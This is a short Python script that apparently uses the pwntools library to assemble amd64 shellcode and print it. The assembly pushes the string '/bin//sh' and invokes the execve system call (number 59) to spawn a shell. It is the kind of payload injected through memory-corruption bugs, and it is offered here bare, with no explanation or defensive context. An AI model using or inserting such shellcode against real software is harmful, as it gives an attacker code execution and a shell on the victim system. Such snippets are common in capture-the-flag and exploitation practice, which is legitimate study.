from pwn import *
context.arch='amd64'
shellcode=asm(
    '''
    xor 	rsi,	rsi			
    push	rsi				
    mov 	rdi,	0x68732f2f6e69622f	 
    push	rdi
    push	rsp		
    pop	rdi				
    mov 	al,	59			
    cdq					
    syscall
    '''
)
print(shellcode)